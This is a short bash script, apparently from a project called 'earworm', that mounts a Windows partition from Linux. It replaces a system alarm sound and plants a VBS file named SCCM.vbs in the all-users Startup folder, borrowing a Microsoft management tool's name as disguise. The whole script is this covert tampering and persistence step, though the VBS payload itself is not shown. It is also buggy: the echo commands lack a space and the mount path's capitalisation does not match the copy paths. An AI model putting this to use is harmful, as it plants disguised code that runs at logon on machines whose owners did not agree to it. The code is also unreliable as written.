#!/bin/bash
winpart=`lsblk -l -o NAME,PARTLABEL | sed '/Basic data partition/!d; s/ .*//g'`; \
echo'Found Windows Partition...'

mount /dev/$winpart /mnt/windows; \
echo'Mounted Windows Partition...'
cp /usr/share/earworm/Alarm11.wav /mnt/Windows/Windows/Media/Alarm11.wav; \
echo'Copied Audio File...'
cp /SCCM.vbs /mnt/Windows/ProgramData/Microsoft/Windows/Start\ Menu/Programs/StartUp/SCCM.vbs; \
echo'Copied VBS Script...'
umount /dev/$winpart; \
echo'Unmounted Windows Partion'
